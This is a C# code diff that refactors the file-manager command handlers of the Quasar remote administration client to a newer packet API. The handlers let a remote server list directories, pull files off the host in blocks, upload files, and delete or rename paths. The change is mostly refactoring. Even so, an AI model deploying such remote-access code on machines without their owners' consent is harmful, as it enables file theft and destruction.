@@ -1,17 +1,18 @@
-﻿using System;
+﻿using Quasar.Common.Packets;
+using System;
 using System.IO;
 using System.Security;
 using System.Threading;
+using Quasar.Common.Enums;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
-using xClient.Enums;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
     public static partial class CommandHandler
     {
-        public static void HandleGetDirectory(Packets.ServerPackets.GetDirectory command, Client client)
+        public static void HandleGetDirectory(GetDirectory command, Client client)
         {
             bool isError = false;
             string message = null;
@@ -55,7 +56,7 @@ namespace xClient.Core.Commands
                 if (folders.Length == 0)
                     folders = new string[] {DELIMITER};
 
-                new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize).Execute(client);
+                client.Send(new GetDirectoryResponse {Files = files, Folders = folders, FilesSize = filessize});
             }
             catch (UnauthorizedAccessException)
             {
@@ -88,11 +89,11 @@ namespace xClient.Core.Commands
             finally
             {
                 if (isError && !string.IsNullOrEmpty(message))
-                    new Packets.ClientPackets.SetStatusFileManager(message, true).Execute(client);
+                    client.Send(new SetStatusFileManager {Message = message, SetLastDirectorySeen = true});
             }
         }
 
-        public static void HandleDoDownloadFile(Packets.ServerPackets.DoDownloadFile command, Client client)
+        public static void HandleDoDownloadFile(DoDownloadFile command, Client client)
         {
             new Thread(() =>
             {
@@ -105,7 +106,7 @@ namespace xClient.Core.Commands
 
                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                     {
-                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
+                        if (!client.Connected || _canceledDownloads.ContainsKey(command.Id))
                             break;
 
                         byte[] block;
@@ -113,30 +114,52 @@ namespace xClient.Core.Commands
                         if (!srcFile.ReadBlock(currentBlock, out block))
                             throw new Exception(srcFile.LastError);
 
-                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
-                            Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
-                            srcFile.LastError).Execute(client);
+
+                        client.SendBlocking(new DoDownloadFileResponse
+                        {
+                            Id = command.Id,
+                            Filename = Path.GetFileName(command.RemotePath),
+                            Block = block,
+                            MaxBlocks = srcFile.MaxBlocks,
+                            CurrentBlock = currentBlock,
+                            CustomMessage = srcFile.LastError
+                        });
                     }
                 }
                 catch (Exception ex)
                 {
-                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message)
-                        .Execute(client);
+                    client.SendBlocking(new DoDownloadFileResponse
+                    {
+                        Id = command.Id,
+                        Filename = Path.GetFileName(command.RemotePath),
+                        Block = new byte[0],
+                        MaxBlocks = -1,
+                        CurrentBlock = -1,
+                        CustomMessage = ex.Message
+                    });
                 }
                 _limitThreads.Release();
             }).Start();
         }
 
-        public static void HandleDoDownloadFileCancel(Packets.ServerPackets.DoDownloadFileCancel command, Client client)
+        public static void HandleDoDownloadFileCancel(DoDownloadFileCancel command, Client client)
         {
-            if (!_canceledDownloads.ContainsKey(command.ID))
+            if (!_canceledDownloads.ContainsKey(command.Id))
             {
-                _canceledDownloads.Add(command.ID, "canceled");
-                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
+                _canceledDownloads.Add(command.Id, "canceled");
+                client.SendBlocking(new DoDownloadFileResponse
+                {
+                    Id = command.Id,
+                    Filename = "canceled",
+                    Block = new byte[0],
+                    MaxBlocks = -1,
+                    CurrentBlock = -1,
+                    CustomMessage = "Canceled"
+                });
             }
         }
 
-        public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
+        public static void HandleDoUploadFile(DoUploadFile command, Client client)
         {
             if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
                 NativeMethods.DeleteFile(command.RemotePath); // delete existing file
@@ -145,7 +168,7 @@ namespace xClient.Core.Commands
             destFile.AppendBlock(command.Block, command.CurrentBlock);
         }
 
-        public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
+        public static void HandleDoPathDelete(DoPathDelete command, Client client)
         {
             bool isError = false;
             string message = null;
@@ -162,15 +185,23 @@ namespace xClient.Core.Commands
                 {
                     case PathType.Directory:
                         Directory.Delete(command.Path, true);
-                        new Packets.ClientPackets.SetStatusFileManager("Deleted directory", false).Execute(client);
+                        client.Send(new SetStatusFileManager
+                        {
+                            Message = "Deleted directory",
+                            SetLastDirectorySeen = false
+                        });
                         break;
                     case PathType.File:
                         File.Delete(command.Path);
-                        new Packets.ClientPackets.SetStatusFileManager("Deleted file", false).Execute(client);
+                        client.Send(new SetStatusFileManager
+                        {
+                            Message = "Deleted file",
+                            SetLastDirectorySeen = false
+                        });
                         break;
                 }
 
-                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path)), client);
+                HandleGetDirectory(new GetDirectory { RemotePath = Path.GetDirectoryName(command.Path) }, client);
             }
             catch (UnauthorizedAccessException)
             {
@@ -195,11 +226,11 @@ namespace xClient.Core.Commands
             finally
             {
                 if (isError && !string.IsNullOrEmpty(message))
-                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
+                    client.Send(new SetStatusFileManager {Message = message, SetLastDirectorySeen = false});
             }
         }
 
-        public static void HandleDoPathRename(Packets.ServerPackets.DoPathRename command, Client client)
+        public static void HandleDoPathRename(DoPathRename command, Client client)
         {
             bool isError = false;
             string message = null;
@@ -216,15 +247,23 @@ namespace xClient.Core.Commands
                 {
                     case PathType.Directory:
                         Directory.Move(command.Path, command.NewPath);
-                        new Packets.ClientPackets.SetStatusFileManager("Renamed directory", false).Execute(client);
+                        client.Send(new SetStatusFileManager
+                        {
+                            Message = "Renamed directory",
+                            SetLastDirectorySeen = false
+                        });
                         break;
                     case PathType.File:
                         File.Move(command.Path, command.NewPath);
-                        new Packets.ClientPackets.SetStatusFileManager("Renamed file", false).Execute(client);
+                        client.Send(new SetStatusFileManager
+                        {
+                            Message = "Renamed file",
+                            SetLastDirectorySeen = false
+                        });
                         break;
                 }
 
-                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
+                HandleGetDirectory(new GetDirectory {RemotePath = Path.GetDirectoryName(command.NewPath)}, client);
             }
             catch (UnauthorizedAccessException)
             {
@@ -249,7 +288,7 @@ namespace xClient.Core.Commands
             finally
             {
                 if (isError && !string.IsNullOrEmpty(message))
-                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
+                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
             }
         }
     }
